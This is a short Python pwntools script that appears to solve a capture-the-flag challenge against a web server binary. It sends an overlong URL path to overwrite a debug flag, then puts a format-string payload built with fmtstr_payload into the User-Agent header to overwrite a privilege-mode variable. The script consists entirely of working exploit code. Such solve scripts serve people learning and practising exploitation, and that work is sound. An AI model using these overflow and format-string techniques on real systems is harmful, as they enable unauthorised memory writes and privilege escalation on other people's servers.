#!/usr/bin/env python3

import requests

from pwn import *

e = ELF('./challenge/server')
# libc = ELF('./libc.so.6')
# rop = ROP(e)

context.binary = e
context.terminal = ['tmux', 'split', '-h']

def main():
    s = requests.Session()
    # This url should overwrite the ctx.debug to true
    overwrite_debug_payload = 'flag.txt' + 'a' * 0x20
    overwrite_debug_url = f'http://{args.REMOTE}/{overwrite_debug_payload}'
    info(f'The overwrite_debug url is {overwrite_debug_url}')
    # Use this payload to find the #(pointer) of "AAAAAAAA"
    # Then we use what we learned from the Space-Pirate-Entrypoint.
    # payload = 'AAAAAAAA%1$p%2$p%3$p%4$p%5$p%6$p%7$p%8$p%9$p'
    target = e.sym.PRIV_MODE
    info(f'Target address is {hex(target)}')
    value = u32(b'ON\x00\x00')
    info(f'Target value is {value}')
    writes = {
            target: value,
            }
    payload = b'curl'
    payload += fmtstr_payload(8, writes, write_size='short', numbwritten=len(payload))
    # The generated string is b'curl%20043c%10$llnaaiQ@\x00\x00\x00\x00\x00'
    # Note that it puts the address at the end which is smart because the '\x00' will somehow truncate the string
    info(f'Payload is {payload}')
    s.headers.update({
        'User-Agent': payload,
        })
    s.get(overwrite_debug_url)


if __name__ == "__main__":
    main()
